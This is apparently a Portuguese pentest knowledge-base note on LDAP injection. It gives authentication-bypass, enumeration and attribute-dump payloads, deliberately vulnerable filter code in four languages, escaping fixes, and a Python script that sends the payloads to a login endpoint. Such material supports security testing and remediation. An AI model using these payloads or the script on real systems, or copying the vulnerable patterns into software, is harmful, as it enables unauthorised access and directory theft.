# LDAP Injection

**Tags:** #critico #ldap #active-directory #auth-bypass #enterprise
**OWASP:** A03:2021 — Injection
**CVSS Base:** 9.8 (Crítico — bypass de autenticação corporativa)

---

## 📖 O que é

Aplicações enterprise que integram com Active Directory ou LDAP para autenticação são vulneráveis quando input do usuário é concatenado em queries LDAP sem sanitização. Permite bypass completo de autenticação e dump de todos os objetos do diretório.

---

## 🔍 `grep_search` Táticas

```
ldap_search(
ldap_bind(
LdapConnection
DirectorySearcher
ldap.search(
ActiveDirectory
ldap.open(
openldap
python-ldap
ldap3
```

**Verificar:** o input é sanitizado com `ldap_escape()` ou equivalente antes de qualquer operação LDAP?

---

## 🎯 Sintaxe LDAP de Referência

```
# Filtro LDAP básico
(&(uid=USUARIO)(password=SENHA))

# Significado de operadores:
(&  → AND (todos os critérios devem ser verdadeiros)
(|  → OR (qualquer critério verdadeiro)
(!  → NOT (nega o critério)
*   → wildcard (qualquer valor)

# Atributos comuns
uid          → identificador de usuário
cn           → common name (nome completo)
sn           → surname (sobrenome)
mail         → e-mail
memberOf     → grupos que o usuário pertence
userPassword → senha (hash)
```

---

## 💣 Payloads de Exploit

### Bypass de Autenticação Clássico

```
Username: *)(uid=*))(|(uid=*
Password: qualquer
```

**Query LDAP construída:**
```
(&(uid=*)(uid=*))(|(uid=*)(password=qualquer))

↓ simplificada:
(&(uid=QUALQUER_UID)(1=1))  → sempre verdadeiro

→ Autenticação como o primeiro usuário no diretório (geralmente admin)
```

---

### Enumeração de Usuários

```
Username: admin)(|(uid=*
Password: x

→ (&(uid=admin)(|(uid=*)(password=x))
   ↑ UID=* retorna todos os usuários que existem
```

**Se a resposta varia (tamanho, tempo) com base na existência do usuário:**
```
Username: admi*      → testa se existe alguém com UID começando em 'admi'
Username: admin      → testa usuário 'admin' exato
Username: administr* → testa prefixo mais longo
```

---

### Dump de Atributos Sensíveis

```
# Se o campo buscado é "mail" e filtra pelo username injetado:
Username: *)(|(mail=*
# → a query retorna TODOS os e-mails do diretório
```

---

### Bypass por Caracteres Especiais

```
Caracteres especiais LDAP: ( ) \ * NUL \0 /

Injeção via:
*               → wildcard → qualquer senha
)(uid=*))(&(uid=admin
)(|(uid=*
\00            → null byte pode truncar filtros
```

---

## 💣 Padrões Vulneráveis por Linguagem

### PHP

```php
// ❌ VULNERÁVEL — concatenação direta
$username = $_POST['username'];
$password = $_POST['password'];

$filter = "(&(uid=$username)(userPassword=$password))";
$result = ldap_search($ldapConn, $baseDN, $filter);
```

### Python — python-ldap

```python
# ❌ VULNERÁVEL
import ldap

username = request.form['username']
password = request.form['password']

filter_str = f"(&(uid={username})(userPassword={password}))"
result = conn.search_s(base_dn, ldap.SCOPE_SUBTREE, filter_str)
```

### Java

```java
// ❌ VULNERÁVEL
String username = request.getParameter("username");
String filter = "(&(uid=" + username + ")(objectClass=person))";
NamingEnumeration results = ctx.search(base, filter, new SearchControls());
```

### C# — DirectorySearcher

```csharp
// ❌ VULNERÁVEL
string username = Request.Form["username"];
DirectorySearcher ds = new DirectorySearcher();
ds.Filter = "(&(sAMAccountName=" + username + ")(objectClass=user))";
SearchResult result = ds.FindOne();
```

---

## 🛡️ Correção

### PHP — `ldap_escape()`

```php
// ✅ CORRETO
$username = ldap_escape($_POST['username'], '', LDAP_ESCAPE_FILTER);
$password = ldap_escape($_POST['password'], '', LDAP_ESCAPE_FILTER);
$filter = "(&(uid=$username)(userPassword=$password))";
```

### Python — ldap3 com escape

```python
# ✅ CORRETO — ldap3
from ldap3 import Server, Connection, ALL
from ldap3.utils.conv import escape_filter_chars

username = escape_filter_chars(request.form['username'])
password = escape_filter_chars(request.form['password'])

filter_str = f"(&(uid={username})(userPassword={password}))"
conn.search(base_dn, filter_str, attributes=['cn', 'mail'])
```

### Regra Geral de Escaping

```
Caracteres a escapar em filtros LDAP:
( → \28
) → \29
* → \2a
\ → \5c
\0 (NUL) → \00
/ → \2f (em DNs)
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_ldap_injection.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/api/login"

PAYLOADS = [
    # Bypass clássico
    {"username": "*", "password": "*"},
    {"username": "*)(uid=*))(|(uid=*", "password": "x"},
    {"username": "admin)(|(uid=*", "password": "x"},
    # Wildcard na senha
    {"username": "admin", "password": "*"},
    # Null byte
    {"username": "admin\x00", "password": "test"},
]

for p in PAYLOADS:
    r = requests.post(f"{TARGET}{ENDPOINT}", json=p, timeout=10)
    if r.status_code == 200 and ('token' in r.text or 'session' in r.text or 'success' in r.text.lower()):
        print(f"[🔴 CRÍTICO] LDAP Injection Auth Bypass: {p}")
        print(f"  Response: {r.text[:200]}")
    else:
        print(f"[ok] {p} ({r.status_code})")
```

---

## 🔗 Chain Exploits

```
LDAP Injection Auth Bypass → Login como admin corporativo → Acesso total ao sistema
LDAP Injection + dump de diretório → Hash de senhas AD → Lateral movement na rede
LDAP Injection → enumerar membros de grupos privilegiados → Targeted phishing
LDAP Injection + AD + Kerberoasting → Comprometimento do domínio inteiro
LDAP Injection Time-Based → Exfiltrar atributos bit a bit via timing
```

---

## 📌 Referências
- [[NoSQL Injection]]
- [[SQL Injection (SQLi)]]
- [[Autenticação & Gestão de Sessão]]
- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [HackTricks LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)
